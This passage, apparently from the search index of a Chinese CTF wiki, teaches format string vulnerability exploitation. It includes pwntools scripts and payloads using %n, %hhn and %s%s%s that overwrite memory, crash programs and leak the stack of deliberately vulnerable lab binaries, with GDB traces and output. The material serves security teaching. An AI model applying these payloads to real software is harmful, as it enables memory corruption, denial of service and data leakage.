0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u57280xffffcd28\u5904\u5b58\u50a8\u7740\u53d8\u91cfc\u7684\u6570\u503c\u3002\u7ee7\u800c\uff0c\u6211\u4eec\u518d\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32'%d%d'\u7684\u5730\u57400xffffcd28\u76f8\u5bf9\u4e8eprintf\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u65700xffffcd10\u7684\u504f\u79fb\u4e3a0x18\uff0c\u5373\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5f53\u4e8eprintf\u51fd\u6570\u7684\u7b2c7\u4e2a\u53c2\u6570\uff0c\u76f8\u5f53\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c6\u4e2a\u53c2\u6570\u3002 \u8fdb\u884c\u8986\u76d6 \u00b6 \u8fd9\u6837\uff0c\u7b2c6\u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cfc\u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528%n\u7684\u7279\u5f81\u6765\u4fee\u6539c\u7684\u503c\u3002payload\u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u516512\u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u523016\u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539c\u7684\u503c\u4e3a16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc (): sh = process ( './overwrite' ) c_addr = int ( sh . recvuntil ( ' \\n ' , drop = True ), 16 ) print hex ( c_addr ) payload = p32 ( c_addr ) + ' %012d ' + '%6$n' print payload #gdb.attach(sh) sh . sendline ( payload ) print sh . recv () sh . interactive () forc () \u7ed3\u679c\u5982\u4e0b \u279c overwrite git: ( master ) \u2717 python exploit.py [ + ] Starting local process './overwrite' : pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6 $n \u070c\ufffd\ufffd-00000160648modified c. \u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58 \u00b6 \u8986\u76d6\u5c0f\u6570\u5b57 \u00b6 \u9996\u5148\uff0c\u6211\u4eec\u6765\u8003\u8651\u4e00\u4e0b\u5982\u4f55\u4fee\u6539data\u6bb5\u7684\u53d8\u91cf\u4e3a\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4\uff0c \u5c0f\u4e8e\u673a\u5668\u5b57\u957f\u7684\u6570\u5b57 \u3002\u8fd9\u91cc\u4ee52\u4e3a\u4f8b\u3002\u53ef\u80fd\u4f1a\u89c9\u5f97\u8fd9\u5176\u5b9e\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u53ef\u4ed4\u7ec6\u4e00\u60f3\uff0c\u771f\u7684\u6ca1\u6709\u4e48\uff1f\u5982\u679c\u6211\u4eec\u8fd8\u662f\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u90a3\u4e48\u5c06\u76f4\u63a5\u5360\u7528\u673a\u5668\u5b57\u957f\u4e2a(4\u62168)\u5b57\u8282\u3002\u663e\u7136\uff0c\u65e0\u8bba\u4e4b\u540e\u5982\u4f55\u8f93\u51fa\uff0c\u90fd\u53ea\u4f1a\u6bd44\u5927\u3002 \u6216\u8bb8\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6574\u5f62\u6ea2\u51fa\u6765\u4fee\u6539\u5bf9\u5e94\u7684\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u6837\u5c06\u9762\u4e34\u7740\u6211\u4eec\u5f97\u4e00\u6b21\u8f93\u51fa\u5927\u91cf\u7684\u5185\u5bb9\u3002\u800c\u8fd9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u57fa\u672c\u90fd\u4e0d\u4f1a\u653b\u51fb\u6210\u529f\u3002 \u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u505a\u5462\uff1f\u518d\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5c06\u6240\u8981\u8986\u76d6\u7684\u53d8\u91cf\u7684\u5730\u5740\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\u4e48\uff1f\u4f3c\u4e4e\u6ca1\u6709\uff0c\u6211\u4eec\u5f53\u65f6\u53ea\u662f\u4e3a\u4e86\u5bfb\u627e\u504f\u79fb\uff0c\u6240\u4ee5\u624d\u628atag\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\uff0c\u5982\u679c\u6211\u4eec\u628atag\u653e\u5728\u4e2d\u95f4\uff0c\u5176\u5b9e\u4e5f\u662f\u65e0\u59a8\u7684\u3002\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u628a\u5730\u5740\u653e\u5728\u4e2d\u95f4\uff0c\u53ea\u8981\u80fd\u591f\u627e\u5230\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u5176\u7167\u6837\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u6570\u503c\u3002\u524d\u9762\u5df2\u7ecf\u8bf4\u4e86\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4e3a\u7b2c6\u4e2a\u53c2\u6570\u3002\u7531\u4e8e\u6211\u4eec\u60f3\u8981\u628a2\u5199\u5230\u5bf9\u5e94\u7684\u5730\u5740\u5904\uff0c\u6545\u800c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u524d\u9762\u7684\u5b57\u8282\u5fc5\u987b\u662f aa%k$nxx \u6b64\u65f6\u5bf9\u5e94\u7684\u5b58\u50a8\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5df2\u7ecf\u5360\u636e\u4e866\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6211\u4eec\u518d\u6dfb\u52a0\u4e24\u4e2a\u5b57\u7b26aa\uff0c\u90a3\u4e48\u5176\u5b9eaa%k\u5c31\u662f\u7b2c6\u4e2a\u53c2\u6570\uff0c$nxx\u5176\u5b9e\u5c31\u662f\u7b2c7\u4e2a\u53c2\u6570\uff0c\u540e\u9762\u6211\u4eec\u5982\u679c\u8ddf\u4e0a\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740\uff0c\u90a3\u5c31\u662f\u7b2c8\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u8fd9\u91cc\u8bbe\u7f6ek\u4e3a8\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u8986\u76d6\u4e86\u3002 \u5229\u7528ida\u53ef\u4ee5\u5f97\u5230a\u7684\u5730\u5740\u4e3a0x0804A024\uff08\u7531\u4e8ea\u3001b\u662f\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\uff0c\u56e0\u6b64\u4e0d\u5728\u5806\u6808\u4e2d\uff09\u3002 .data: 0804 A024 public a .data: 0804 A024 a dd 7 Bh \u6545\u800c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684\u5229\u7528\u4ee3\u7801 def fora (): sh = process ( './overwrite' ) a_addr = 0x0804A024 payload = 'aa%8$naa' + p32 ( a_addr ) sh . sendline ( payload ) print sh . recv () sh . interactive () \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b \u279c overwrite git: ( master ) \u2717 python exploit.py [ + ] Starting local process './overwrite' : pid 76508 [ * ] Process './overwrite' stopped with exit code 0 ( pid 76508 ) 0xffc1729c aaaa$ \\x a0 \\x 0modified a for a small number. \u5176\u5b9e\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u638c\u63e1\u7684\u5c0f\u6280\u5de7\u5c31\u662f\uff0c\u6211\u4eec\u6ca1\u6709\u5fc5\u8981\u5fc5\u987b\u628a\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u653e\u5728\u90a3\u91cc\u90fd\u53ef\u4ee5\uff0c\u53ea\u8981\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5176\u5bf9\u5e94\u7684\u504f\u79fb\u5373\u53ef\u3002 \u8986\u76d6\u5927\u6570\u5b57 \u00b6 \u4e0a\u9762\u4ecb\u7ecd\u4e86\u8986\u76d6\u5c0f\u6570\u5b57\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u5c11\u8986\u76d6\u5927\u6570\u5b57\u4e86\u3002\u4e0a\u9762\u6211\u4eec\u4e5f\u8bf4\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u4e00\u6b21\u6027\u8f93\u51fa\u5927\u6570\u5b57\u4e2a\u5b57\u8282\u6765\u8fdb\u884c\u8986\u76d6\uff0c\u4f46\u662f\u8fd9\u6837\u57fa\u672c\u4e5f\u4e0d\u4f1a\u6210\u529f\uff0c\u56e0\u4e3a\u592a\u957f\u4e86\u3002\u800c\u4e14\u5373\u4f7f\u6210\u529f\uff0c\u6211\u4eec\u4e00\u6b21\u6027\u7b49\u5f85\u7684\u65f6\u95f4\u4e5f\u592a\u957f\u4e86\uff0c\u90a3\u4e48\u6709\u6ca1\u6709\u4ec0\u4e48\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\u5462\uff1f\u81ea\u7136\u662f\u6709\u4e86\u3002 \u4e0d\u8fc7\u5728\u4ecb\u7ecd\u4e4b\u524d\uff0c\u6211\u4eec\u5f97\u5148\u518d\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\uff0c\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u683c\u5f0f\u3002\u9996\u5148\uff0c\u6240\u6709\u7684\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u90fd\u662f\u4ee5\u5b57\u8282\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6b64\u5916\uff0c\u5728x86\u548cx64\u7684\u4f53\u7cfb\u7ed3\u6784\u4e2d\uff0c\u53d8\u91cf\u7684\u5b58\u50a8\u683c\u5f0f\u4e3a\u4ee5\u5c0f\u7aef\u5b58\u50a8\uff0c\u5373\u6700\u4f4e\u6709\u6548\u4f4d\u5b58\u50a8\u5728\u4f4e\u5730\u5740\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c0x12345678\u5728\u5185\u5b58\u4e2d\u7531\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u4f9d\u6b21\u4e3a\\x78\\x56\\x34\\x12\u3002\u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u56de\u5fc6\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u6807\u5fd7\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u8fd9\u4e48\u4e24\u4e2a\u6807\u5fd7\uff1a hh \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4ecechar\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002 h \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4eceshort\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002 \u6240\u4ee5\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528%hhn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u5355\u5b57\u8282\uff0c\u5229\u7528%hn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u53cc\u5b57\u8282\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5\u5355\u5b57\u8282\u4e3a\u4f8b\u3002 \u9996\u5148\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u786e\u5b9a\u7684\u662f\u8981\u8986\u76d6\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u5229\u7528ida\u770b\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u5730\u5740\u4e3a0x0804A028\u3002 .data:0804A028 public b .data:0804A028 b dd 1C8h ; DATA XREF: main:loc_8048510\u0018r \u5373\u6211\u4eec\u5e0c\u671b\u5c06\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8986\u76d6\uff0c\u524d\u9762\u4e3a\u8986\u76d6\u5730\u5740\uff0c\u540e\u9762\u4e3a\u8986\u76d6\u5185\u5bb9\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u7684payload\u57fa\u672c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684 p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n' \u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u8fdb\u884c\u8ba1\u7b97\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u57fa\u672c\u7684\u6784\u9020\uff0c\u5982\u4e0b def fmt ( prev , word , index ): if prev < word : result = word - prev fmtstr = \"%\" + str ( result ) + \"c\" elif prev == word : result = 0 else : result = 256 + word - prev fmtstr = \"%\" + str ( result ) + \"c\" fmtstr += \"%\" + str ( index ) + \"$hhn\" return fmtstr def fmt_str ( offset , size , addr , target ): payload = \"\" for i in range ( 4 ): if size == 4 : payload += p32 ( addr + i ) else : payload += p64 ( addr + i ) prev = len ( payload ) for i in range ( 4 ): payload += fmt ( prev , ( target >> i * 8 ) & 0xff , offset + i ) prev = ( target >> i * 8 ) & 0xff return payload payload = fmt_str ( 6 , 4 , 0x0804A028 , 0x12345678 ) \u5176\u4e2d\u6bcf\u4e2a\u53c2\u6570\u7684\u542b\u4e49\u57fa\u672c\u5982\u4e0b offset\u8868\u793a\u8981\u8986\u76d6\u7684\u5730\u5740\u6700\u521d\u7684\u504f\u79fb size\u8868\u793a\u673a\u5668\u5b57\u957f addr\u8868\u793a\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u3002 target\u8868\u793a\u6211\u4eec\u8981\u8986\u76d6\u4e3a\u7684\u76ee\u7684\u53d8\u91cf\u503c\u3002 \u76f8\u5e94\u7684exploit\u5982\u4e0b def forb (): sh = process ( './overwrite' ) payload = fmt_str ( 6 , 4 , 0x0804A028 , 0x12345678 ) print payload sh . sendline ( payload ) print sh . recv () sh . interactive () \u7ed3\u679c\u5982\u4e0b \u279c overwrite git :( master ) \u2717 python exploit . py [ + ] Starting local process './overwrite' : pid 78547 ( \\ xa0 \\ x0 ) \\ xa0 \\ x0 * \\ xa0 \\ x0 + \\ xa0 \\ x0 % 104 c % 6 $ hhn % 222 c % 7 $ hhn % 222 c % 8 $ hhn % 222 c % 9 $ hhn [ * ] Process './overwrite' stopped with exit code 0 ( pid 78547 ) 0xfff6f9bc ( \\ xa0 \\ x0 ) \\ xa0 \\ x0 * \\ xa0 \\ x0 + \\ xa0 \\ x0 X \ufffd \\ xbb ~ modified b for a big number ! \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528%n\u5206\u522b\u5bf9\u6bcf\u4e2a\u5730\u5740\u8fdb\u884c\u5199\u5165\uff0c\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u7b54\u6848\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u5199\u5165\u7684\u53d8\u91cf\u90fd\u53ea\u4f1a\u5f71\u54cd\u7531\u5176\u5f00\u59cb\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u4e00\u4e2a\u53d8\u91cf\u5199\u5b8c\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4fee\u6539\u4e4b\u540e\u7684\u4e09\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u6709\u53ef\u80fd\u56e0\u6b64\u5d29\u6e83\u3002\u800c\u91c7\u7528%hhn\u5219\u4e0d\u4f1a\u6709\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u4fee\u6539\u76f8\u5e94\u5730\u5740\u7684\u4e00\u4e2a\u5b57\u8282\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"pwn/fmtstr/fmtstr_exploit/#_1","text":"\u5176\u5b9e\uff0c\u5728\u4e0a\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5c55\u793a\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u4e24\u4e2a\u5229\u7528\u624b\u6bb5 \u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u56e0\u4e3a%s\u5bf9\u5e94\u7684\u53c2\u6570\u5730\u5740\u4e0d\u5408\u6cd5\u7684\u6982\u7387\u6bd4\u8f83\u5927\u3002 \u67e5\u770b\u8fdb\u7a0b\u5185\u5bb9\uff0c\u6839\u636e%d\uff0c%f\u8f93\u51fa\u4e86\u6808\u4e0a\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u6211\u4eec\u4f1a\u5bf9\u4e8e\u6bcf\u4e00\u65b9\u9762\u8fdb\u884c\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u91ca\u3002","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"pwn/fmtstr/fmtstr_exploit/#_2","text":"\u901a\u5e38\u6765\u8bf4\uff0c\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u662f\u6700\u4e3a\u7b80\u5355\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\u82e5\u5e72\u4e2a%s\u5373\u53ef %s%s%s%s%s%s%s%s%s%s%s%s%s%s \u8fd9\u662f\u56e0\u4e3a\u6808\u4e0a\u4e0d\u53ef\u80fd\u6bcf\u4e2a\u503c\u90fd\u5bf9\u5e94\u4e86\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6240\u4ee5\u603b\u662f\u4f1a\u6709\u67d0\u4e2a\u5730\u5740\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u3002\u8fd9\u4e00\u5229\u7528\uff0c\u867d\u7136\u653b\u51fb\u8005\u672c\u8eab\u4f3c\u4e4e\u5e76\u4e0d\u80fd\u63a7\u5236\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6837\u5374\u53ef\u4ee5\u9020\u6210\u7a0b\u5e8f\u4e0d\u53ef\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u8fdc\u7a0b\u670d\u52a1\u6709\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u5176\u53ef\u7528\u6027\uff0c\u4f7f\u670d\u52a1\u5d29\u6e83\uff0c\u8fdb\u800c\u4f7f\u5f97\u7528\u6237\u4e0d\u80fd\u591f\u8bbf\u95ee\u3002","title":"\u7a0b\u5e8f\u5d29\u6e83"},{"location":"pwn/fmtstr/fmtstr_exploit/#_3","text":"\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528GOT\u8868\u5f97\u5230libc\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83libc\u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump\u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002","title":"\u6cc4\u9732\u5185\u5b58"},{"location":"pwn/fmtstr/fmtstr_exploit/#_4","text":"\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> int main () { char s [ 100 ]; int a = 1 , b = 0x22222222 , c = - 1 ; scanf ( \"%s\" , s ); printf ( \"%08x.%08x.%08x.%s \\n \" , a , b , c , s ); printf ( s ); return 0 ; } \u7136\u540e\uff0c\u6211\u4eec\u7b80\u5355\u7f16\u8bd1\u4e00\u4e0b \u279c leakmemory git: ( master ) \u2717 make gcc -fno-stack-protector -no-pie -o leakmemory leakmemory.c leakmemory.c: In function \u2018main\u2019: leakmemory.c:7:10: warning: format not a string literal and no format arguments [ -Wformat-security ] printf ( s ) ; ^ \u53ef\u4ee5\u770b\u51fa\uff0c\u7f16\u8bd1\u5668\u6307\u51fa\u4e86\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u6ca1\u6709\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u7684\u95ee\u9898\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\uff0c\u5982\u4f55\u83b7\u53d6\u5bf9\u5e94\u7684\u6808\u5185\u5b58\u3002 \u6839\u636eC\u8bed\u8a00\u7684\u8c03\u7528\u89c4\u5219\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f4\u63a5\u4f7f\u7528\u6808\u4e0a\u81ea\u9876\u5411\u4e0a\u7684\u53d8\u91cf\u4f5c\u4e3a\u5176\u53c2\u6570(64\u4f4d\u4f1a\u6839\u636e\u5176\u4f20\u53c2\u7684\u89c4\u5219\u8fdb\u884c\u83b7\u53d6)\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd32\u4f4d\u3002","title":"\u6cc4\u9732\u6808\u5185\u5b58"},{"location":"pwn/fmtstr/fmtstr_exploit/#_5","text":"\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u83b7\u53d6\u6808\u4e0a\u53d8\u91cf\u7684\u6570\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u8bd5\u4e00\u4e0b\uff0c\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c leakmemory git: ( master ) \u2717 ./leakmemory %08x.%08x.%08x 00000001 .22222222.ffffffff.%08x.%08x.%08x ffcfc400.000000c2.f765a6bb \u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86\u4e00\u4e9b\u5185\u5bb9\u3002\u4e3a\u4e86\u66f4\u52a0\u7ec6\u81f4\u7684\u89c2\u5bdf\uff0c\u6211\u4eec\u5229\u7528GDB\u6765\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u9a8c\u8bc1\u6211\u4eec\u7684\u60f3\u6cd5\uff0c\u8fd9\u91cc\u5220\u9664\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u53ea\u5173\u6ce8\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6808\u3002 \u9996\u5148\uff0c\u542f\u52a8\u7a0b\u5e8f\uff0c\u5c06\u65ad\u70b9\u4e0b\u8f7dprintf\u51fd\u6570\u5904 \u279c leakmemory git: ( master ) \u2717 gdb leakmemory gef\u27a4 b printf Breakpoint 1 at 0x8048330 \u4e4b\u540e\uff0c\u8fd0\u884c\u7a0b\u5e8f gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory %08x.%08x.%08x \u6b64\u65f6\uff0c\u7a0b\u5e8f\u7b49\u5f85\u6211\u4eec\u7684\u8f93\u5165\uff0c\u8fd9\u65f6\u6211\u4eec\u8f93\u5165%08x.%08x.%08x\uff0c\u7136\u540e\u6572\u51fb\u56de\u8f66\uff0c\u662f\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u9996\u5148\u65ad\u5728\u4e86\u7b2c\u4e00\u6b21\u8c03\u7528printf\u51fd\u6570\u7684\u4f4d\u7f6e Breakpoint 1 , __printf ( format = 0x8048563 \"%08x.%08x.%08x.%s\\n\" ) at printf.c:28 28 printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ code:i386 ] \u2500\u2500\u2500\u2500 0xf7e44667 <fprintf+23> inc DWORD PTR [ ebx+0x66c31cc4 ] 0xf7e4466d nop 0xf7e4466e xchg ax, ax \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccec' , 'l8' ] 8 0xffffccec\u2502+0x00: 0x080484bf \u2192 <main+84> add esp, 0x20 \u2190 $esp 0xffffccf0\u2502+0x04: 0x08048563 \u2192 \"%08x.%08x.%08x.%s\" 0xffffccf4\u2502+0x08: 0x00000001 0xffffccf8\u2502+0x0c: 0x22222222 0xffffccfc\u2502+0x10: 0xffffffff 0xffffcd00\u2502+0x14: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd04\u2502+0x18: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x1c: 0x000000c2 \u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u65f6\u6b64\u65f6\u5df2\u7ecf\u8fdb\u5165\u4e86printf\u51fd\u6570\u4e2d\uff0c\u6808\u4e2d\u7b2c\u4e00\u4e2a\u53d8\u91cf\u4e3a\u8fd4\u56de\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u7b2c\u4e09\u4e2a\u53d8\u91cf\u4e3aa\u7684\u503c\uff0c\u7b2c\u56db\u4e2a\u53d8\u91cf\u4e3ab\u7684\u503c\uff0c\u7b2c\u4e94\u4e2a\u53d8\u91cf\u4e3ac\u7684\u503c\uff0c\u7b2c\u516d\u4e2a\u53d8\u91cf\u4e3a\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002\u7ee7\u7eed\u8fd0\u884c\u7a0b\u5e8f gef\u27a4 c Continuing. 00000001 .22222222.ffffffff.%08x.%08x.%08x 